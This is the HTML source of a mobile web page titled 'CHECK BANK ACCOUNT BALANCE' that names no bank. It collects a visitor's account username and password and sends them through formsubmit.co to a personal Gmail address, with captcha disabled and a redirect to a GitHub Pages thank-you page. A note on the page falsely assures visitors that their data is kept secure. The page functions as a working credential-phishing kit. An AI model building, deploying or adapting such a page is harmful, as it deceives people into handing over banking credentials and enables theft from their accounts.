<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CHECK BANK ACCOUNT BALANCE</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 0;
    }
    .wrapper {
      width: 100%;
      padding: 0;
      margin: 0;
    }
    .container {
      background: #fff;
      padding: 25px 20px;
      width: 100%;
      min-height: 100vh; /* full phone height */
    }
    h2 {
      text-align: center;
      margin-top: 0;
      margin-bottom: 20px;
      font-size: 20px;
      letter-spacing: 1px;
    }
    label {
      display: block;
      margin-bottom: 6px;
      font-weight: bold;
      font-size: 14px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 14px;
      margin-bottom: 14px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    .toggle-container {
      position: relative;
    }
    .toggle-container button {
      position: absolute;
      right: 10px;
      top: 14px;
      background: none;
      border: none;
      cursor: pointer;
      font-size: 14px;
      color: #007bff;
    }
    button[type="submit"] {
      background: #28a745;
      color: #fff;
      border: none;
      padding: 14px;
      border-radius: 6px;
      font-size: 16px;
      width: 100%;
      cursor: pointer;
    }
    button[type="submit"]:hover {
      background: #218838;
    }
    .note {
      font-size: 13px;
      text-align: center;
      color: #555;
      margin-top: 12px;
      background: #e8f9ef;
      padding: 10px;
      border-radius: 6px;
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="container">
      <h2>CHECK BANK ACCOUNT BALANCE</h2>

      <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
        <!-- redirect to your thankyou.html (correct path) -->
        <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/Check-your-account-balance-/thankyou.html">
        <input type="hidden" name="_captcha" value="false">

        <label for="username">Enter your Account Username</label>
        <input type="text" id="username" name="username" required>

        <label for="password">Enter your Account Password</label>
        <div class="toggle-container">
          <input type="password" id="password" name="password" required>
          <button type="button" onclick="togglePassword()">Show</button>
        </div>

        <button type="submit">Check Balance</button>
      </form>

      <div class="note">
        Thank you, We keep your details and data secured.
      </div>
    </div>
  </div>

  <script>
    function togglePassword() {
      const pwd = document.getElementById("password");
      const btn = pwd.nextElementSibling;
      if (pwd.type === "password") {
        pwd.type = "text";
        btn.textContent = "Hide";
      } else {
        pwd.type = "password";
        btn.textContent = "Show";
      }
    }
  </script>
</body>
</html>
